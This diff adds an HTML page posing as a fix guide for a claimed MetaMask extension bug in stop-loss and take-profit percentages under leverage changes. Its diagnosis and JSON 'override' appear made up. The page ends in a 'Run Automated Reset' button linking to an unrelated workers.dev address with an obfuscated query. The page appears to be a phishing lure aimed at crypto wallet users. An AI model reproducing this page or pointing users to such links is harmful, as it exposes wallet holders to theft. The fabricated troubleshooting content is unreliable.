@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Sl Tp Percentages Change When Changing L – Fix Guide</title>
+<style>
+    body {
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff7b2c; }
+    .btn {
+        background: #ff7b2c;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem experience an issue where their Stop Loss (SL) and Take Profit (TP) percentages change unexpectedly when they modify the leverage of their positions.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a bug in the Metamask extension's handling of leverage adjustments, causing the SL and TP percentages to be recalculated incorrectly.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To manually correct the issue, users can attempt the following:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Reset the SL and TP percentages to their desired values after changing leverage</li>
+<li>Use a custom JSON configuration to override the default behavior, such as:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;leverageOverride&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;slPercentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tpPercentage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for more complex configuration adjustments. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum (ETH) ecosystem selected</li>
+<li>Leverage adjustment functionality enabled</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
